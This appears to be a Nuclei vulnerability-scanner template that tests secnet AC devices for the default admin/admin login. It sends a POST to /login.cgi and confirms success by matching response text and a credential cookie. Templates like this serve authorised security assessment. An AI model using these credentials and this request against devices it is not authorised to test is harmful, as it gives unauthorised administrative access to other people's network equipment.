id: secnet-ac-default-password

info:
  name: secnet ac - Default Admin Login
  author: ritikchaddha
  severity: high
  description: secnet ac default admin credentials were successful.
  reference:
    - https://bbs.secnet.cn/post/t-30
  classification:
    cpe: cpe:2.3:a:secnet:secnet:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: secnet
    product: secnet
  tags: default-login,secnet,vuln

http:
  - raw:
      - |
        POST /login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        name: secnet
        cpe: cpe:2.3:a:secnet:secnet:*:*:*:*:*:*:*:*
        part: body
        words:
          - "window.open('index.htm"

      - type: word
        name: secnet-2
        cpe: cpe:2.3:a:secnet:secnet:*:*:*:*:*:*:*:*
        part: header
        words:
          - "ac_userid={{username}},ac_passwd="

      - type: status
        status:
          - 200
